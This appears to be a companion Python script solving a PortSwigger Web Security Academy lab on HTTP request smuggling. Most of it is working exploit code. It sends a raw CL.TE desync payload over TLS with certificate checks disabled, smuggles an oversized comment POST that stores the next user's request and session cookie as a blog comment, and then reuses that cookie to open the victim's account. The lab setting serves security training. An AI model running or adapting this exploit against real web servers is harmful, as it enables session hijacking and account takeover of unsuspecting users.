#!/usr/bin/env python3
"""
Exploiting HTTP request smuggling to capture other users' requests
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 06-capture-other-users-requests.md

What this does:
    Smuggles an incomplete "POST /post/comment" request with a
    Content-Length far larger than the comment body we actually supply.
    The back-end keeps consuming bytes from the connection expecting more
    body, so whichever real request lands next on that same back-end
    connection gets appended byte-for-byte into our comment's "comment="
    field instead of being processed on its own -- headers, cookies, and
    all. The lab's simulated victim only browses intermittently, so this
    polls the blog post's comment section repeatedly, watching for a
    stored comment containing a "Cookie:" header that isn't our own.

    Standard HTTP libraries recompute Content-Length and would "fix" this
    oversized-body payload, so the smuggle itself uses a raw socket over
    TLS; normal (non-ambiguous) requests use httpx.

Usage:
    python 06-capture-other-users-requests.py <lab-url>
    e.g. python 06-capture-other-users-requests.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def create_ssl_connection(host: str, port: int = 443, timeout: float = 10.0) -> ssl.SSLSocket:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return ctx.wrap_socket(sock, server_hostname=host)


def send_raw_keep_alive(host: str, payloads: list[bytes], port: int = 443,
                         timeout: float = 10.0, delay: float = 2.0) -> list[bytes]:
    ssl_sock = create_ssl_connection(host, port, timeout)
    responses = []
    try:
        for payload in payloads:
            ssl_sock.sendall(payload)
            time.sleep(delay)
            response = b""
            ssl_sock.settimeout(2.0)
            while True:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            responses.append(response)
        return responses
    finally:
        ssl_sock.close()


def build_clte_payload(host: str, smuggled_request: str, path: str = "/") -> bytes:
    body = "0\r\n\r\n" + smuggled_request
    headers = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
    )
    return (headers + body).encode()


def extract_csrf_token(html: str) -> str | None:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else None


def solve(lab_url: str, post_id: int = 2, capture_length: int = 400,
          poll_attempts: int = 12, poll_interval: float = 10.0) -> None:
    host = urlparse(lab_url).hostname
    normal = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()

    # Get our own session + CSRF token, both needed to make the smuggled
    # comment-post request valid.
    r = httpx.get(f"{lab_url}/post?postId={post_id}", verify=False)
    session_match = re.search(r"session=([^;\s]+)", r.headers.get("set-cookie", ""))
    session = session_match.group(1) if session_match else ""
    csrf = extract_csrf_token(r.text)
    print(f"[*] Session: {session[:20]}..., CSRF: {csrf}")

    # The comment= parameter is positioned last so whatever the back-end appends
    # from the victim's follow-up request lands inside it. Content-Length is
    # deliberately oversized to leave room to capture a full request.
    comment_body = (
        f"csrf={csrf}&postId={post_id}&name=test&email=test%40test.net"
        f"&website=https%3A%2F%2Ftest.net&comment="
    )
    smuggled = (
        "POST /post/comment HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {capture_length}\r\n"
        f"Cookie: session={session}\r\n"
        "\r\n"
        f"{comment_body}"
    )
    attack = build_clte_payload(host, smuggled)

    print("[*] Sending the comment-capture smuggle. The lab's simulated victim "
          "browses intermittently, so this polls the post page for a captured "
          "comment rather than expecting an immediate hit.")

    for attempt in range(1, poll_attempts + 1):
        send_raw_keep_alive(host, [attack, normal])
        time.sleep(poll_interval)

        r2 = httpx.get(f"{lab_url}/post?postId={post_id}", verify=False)
        cookie_match = re.search(r"Cookie:\s*session=([a-zA-Z0-9]+)", r2.text)
        if cookie_match and cookie_match.group(1) != session:
            victim_session = cookie_match.group(1)
            print(f"[+] Captured a victim's session cookie in a stored comment: "
                  f"{victim_session}")

            r3 = httpx.get(f"{lab_url}/my-account",
                            cookies={"session": victim_session}, verify=False)
            print(f"[*] /my-account with victim session -- status {r3.status_code}")
            if r3.status_code == 200:
                print("[+] Lab solved -- accessed the victim's account using their "
                      "captured session cookie.")
            return

        print(f"[*] Poll {attempt}/{poll_attempts}: no victim cookie in comments yet.")

    print("[-] No victim cookie captured. If the comment came back truncated before "
          "the Cookie header, increase capture_length and rerun.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
